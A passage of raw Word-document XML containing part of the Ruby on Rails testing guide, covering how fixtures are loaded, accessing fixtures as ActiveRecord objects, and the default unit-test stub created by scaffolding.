      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="528"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1533084A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="699F0942" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1604529570"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="61D1B428" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">tag is considered Ruby code. When this fixture is loaded, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attribute of the three records will be set to 20/50, 20/2, and 20-69 respectively. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>brightest_on</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attribute will also be evaluated and formatted by Rails to be compatible with the database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F941FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.4 Fixtures in Action</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2965707C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails by default automatically loads all fixtures from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/fixtures</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder for your unit and functional test. Loading involves three steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33991C44" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="312"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Remove any existing data from the table corresponding to the fixture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DE20AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="312"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Load the fixture data into the table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B97E9EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="312"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Dump the fixture data into a variable in case you want to access it directly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF636F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.5 Fixtures are ActiveRecord objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A6691C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Fixtures are instances of ActiveRecord. As mentioned in point #3 above, you can access the object directly because it is automatically setup as a local variable of the test case. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="309A53C8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="501B1B6E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># this will return the User object for the fixture named david</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AF83702" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>users(:david)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F631EB7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="789E4E42" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># this will return the property for david called id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C2D3CE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>users(:david).id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E8543CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7986F4FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># one can also access methods available on the User class</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4971DF8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>email(david.girlfriend.email, david.location_tonight)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B8CE98A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>3 Unit Testing your Models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E80A5B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In Rails, unit tests are what you write to test your models.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE219E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For this guide we will be using Rails </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>scaffolding</w:t>
      </w:r>
      <w:r>
        <w:t>. It will create the model, a migration, controller and views for the new resource in a single operation. It will also create a full test suite following Rails best practices. I will be using examples from this generated code and will be supplementing it with additional examples where necessary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0797E5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For more information on Rails </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>scaffolding</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, refer to </w:t>
      </w:r>
      <w:hyperlink r:id="rId643" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Getting Started with Rails</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3A5AE6DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails generate scaffold</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, for a resource among other things it creates a test stub in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/unit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0CCB240E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C576861" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate scaffold post title:string body:text</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="504C1EA3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13404569" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create  app/models/post.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23B379BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create  test/unit/post_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3751B155" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create  test/fixtures/posts.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="540CDEC6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6832E38F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The default test stub in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/unit/post_test.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> looks like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="60B75905" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0350C0D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C01B990" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7938A686" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>PostTest &lt; ActiveSupport::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D595207" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # Replace this with your real tests.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36AC8706" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "the truth"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13C4B8AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CED102B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D924D97" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="74DEF35F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A line by line examination of this file will help get you oriented to Rails testing code and terminology.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="29BC05F8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="282B8C8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1394039127"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2D3DC187" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As you know by now, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_helper.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> specifies the default configuration to run our tests. This is included with all the tests, so any methods added to this file are available to all your tests.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4728"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="79A90DD7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="353627FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1631979298"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>PostTest &lt; ActiveSupport::TestCase</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6584F7C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>PostTest</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class defines a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>test case</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> because it inherits from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::TestCase</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>PostTest</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> thus has all the methods available from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::TestCase</w:t>
      </w:r>
      <w:r>
        <w:t>. You’ll see those methods a little later in this guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39216A53" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Any method defined within a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Test::Unit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> test case that begins with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (case sensitive) is simply called a test. So, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_valid_password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>testValidPassword</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> all are legal test names and are run automatically when the test case is run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F8C95E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails adds a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method that takes a test name and a block. It generates a normal </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Test::Unit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> test with method names prefixed with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_</w:t>
      </w:r>
      <w:r>
        <w:t>. So,</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0D48993A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50520579" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test "the truth"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75A8C321" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6652B076" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="352B114D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>acts as if you had written</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
